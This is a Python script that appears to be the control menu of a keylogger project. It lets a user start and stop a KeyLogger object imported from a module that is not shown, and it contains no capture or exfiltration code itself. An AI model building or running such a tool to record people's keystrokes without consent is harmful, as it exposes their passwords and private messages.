from KeyLogger import KeyLogger
import time

def main():
    keylogger = KeyLogger()
    while True:
        print("\nKEYLOGGER CONTROL MENU:\n1. Start Keylogger\n2. Stop Keylogger\n3 Exit")

        try:
            # Get user input and convert it to an integer
            opt = int(input("Enter your choice (1-3): ")) 
        except ValueError:
            print("\nInvalide Input. Please enter a number between 1 and 3.")
            time.sleep(1)
            continue
        
        if opt == 1:
            # Start the keylogger if it is not already running
            if keylogger.listener is None or not keylogger.listener.running:
                keylogger.start()
                print("\nKeylogger Started")
            else:
                print("\nKeylogger is already running")
        
        elif opt == 2:
            # Stop the keylogger if it is running
            if keylogger.listener is not None and keylogger.listener.running:
                keylogger.stop()
                print("\nKeylogger stopped")
            else:
                print("\nKeylogger is not running")
        
        elif opt == 3:
            # Exit the program
            if keylogger.listener is not None and keylogger.listener.running:
                keylogger.stop()
            print("\nExiting...")
            break

        else:
            print("\nInvalid choice. Please try again.")
        
        time.sleep(1)

if __name__ == "__main__":
    main()
